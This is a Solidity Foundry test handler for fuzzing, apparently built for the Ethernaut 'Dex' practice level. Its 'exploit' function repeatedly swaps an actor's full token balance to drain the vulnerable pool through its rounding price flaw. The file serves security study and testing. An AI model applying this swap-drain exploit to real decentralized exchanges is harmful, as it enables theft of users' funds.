// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {CommonBase} from "@forge-std/Base.sol";
import {StdCheats} from "@forge-std/StdCheats.sol";
import {StdUtils} from "@forge-std/StdUtils.sol";
import {console} from "@forge-std/console.sol";

import {Dex, SwappableToken} from "../../src/Dex.sol";

interface IDex {
    function token1() external;
    function token2() external;
}


contract Handler is CommonBase, StdCheats, StdUtils {

    address public actor;
    Dex public dex;
    mapping(bytes32 => uint256) public calls;

    modifier countCall(bytes32 key) {
        calls[key]++;
        _;
    }
    constructor(Dex _dex, address _actor) {
        dex = _dex;
        actor = _actor;

        deal(address(this), 1 ether);
    }

    function swapMax(IERC20 tokenIn, IERC20 tokenOut) internal {

        dex.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(actor));
    }

    function exploit (uint256 token2AmountIn) external countCall("exploit") {

        vm.startPrank(actor);

        address token1 = dex.token1();
        address token2 = dex.token2();

        swapMax(IERC20(token1), IERC20(token2));
        swapMax(IERC20(token2), IERC20(token1));
        swapMax(IERC20(token1), IERC20(token2));
        swapMax(IERC20(token2), IERC20(token1));

        // now token 1 is in the pool
        swapMax(IERC20(token1), IERC20(token2));

        token2AmountIn = bound(token2AmountIn, 0, IERC20(token2).totalSupply());

        dex.swap(token2, token1, token2AmountIn);

        vm.stopPrank();
    }

    function callSummary() external view {
        console.log("Call summary:");
        console.log("-------------------");
        console.log("exploit", calls["exploit"]);
    }

    receive() external payable {}
}